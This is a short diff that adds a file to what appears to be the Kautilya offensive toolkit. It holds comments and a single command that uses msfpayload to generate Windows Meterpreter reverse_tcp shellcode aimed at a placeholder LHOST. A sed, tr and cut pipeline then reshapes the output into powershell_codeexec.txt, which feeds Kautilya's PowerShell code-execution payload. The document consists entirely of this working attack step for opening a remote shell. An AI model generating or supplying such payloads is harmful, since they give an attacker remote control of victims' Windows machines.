@@ -1,0 +1,6 @@
+
+#Use this command to generate shellcode for Code Execution using Powershell payload of Kautilya. The code execution technique was first detailed
+#on exploit-monday blog by Matt and below command is adopted from a comment on the blog.
+#The generated shellcode powershell_codeexec.txt is to be copied to src directory of Kautilya.
+
+./msfpayload windows/meterpreter/reverse_tcp LHOST=<IP> EXITFUNC=process C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'> powershell_codeexec.txt
